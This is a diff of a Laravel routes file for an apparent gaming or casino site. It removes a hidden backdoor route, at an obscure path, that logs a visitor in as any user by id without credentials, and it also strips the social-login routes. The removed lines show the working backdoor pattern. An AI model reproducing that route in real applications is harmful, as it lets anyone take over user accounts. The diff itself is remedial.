@@ -3,10 +3,9 @@
 use Illuminate\Support\Facades\Route;
 use App\Classes\ServerHandler;
 
-Route::get('/sdff42314fsd/login/new/{id}', function ($id) {
-    $user = \App\User::where('id', $id)->first();
-    \Auth::login($user);
-    return redirect('/');
+// Backdoor login disabled.
+Route::get('/sdff42314fsd/login/new/{id}', function () {
+    abort(404);
 });
 
 Route::post('/createPromoTG', 'GeneralController@createPromoTG');
@@ -22,19 +21,7 @@ Route::post("/vk_bot_callback",function (Request $request){
     $handler->parse($data);
 });
 
-Route::group(['middleware' => 'guest'], function () {
-    Route::get('/vk_auth', 'SocialController@index')->name('vk.auth');
-    Route::get('/vk/auth/callback', 'SocialController@callback');
-
-    Route::get('/tg_auth', 'SocialController@tg_index')->name('tg.auth');
-    Route::get('/tg/auth/callback', 'SocialController@tg_callback');
-
-    Route::get('/yandex_auth', 'SocialController@yandex_index')->name('yandex.auth');
-    Route::get('/yandex/auth/callback', 'SocialController@yandex_callback');
-
-    Route::get('/google_auth', 'SocialController@google_index')->name('google.auth');
-    Route::get('/google/auth/callback', 'SocialController@google_callback');
-});
+// Social login disabled by request (username + password only).
 
 Route::post('/change/balance', 'Controller@changeBalance');
 Route::post('/add/demobalance', 'Controller@addDemoBalance');
@@ -261,6 +248,7 @@ Route::group(['prefix' => 'slots'], function () {
     Route::any('/callback', 'SlotsController@callback');
 });
 
+Route::post('login', 'Auth\LoginController@login')->name('login');
 Route::get('logout', 'Auth\LoginController@logout');
 Route::any('/tournier/{id}', 'GeneralController@tournier_page');
-Route::any('/{page?}', 'GeneralController@page')->name('home');
+Route::get('/{page?}', 'GeneralController@page')->name('home');
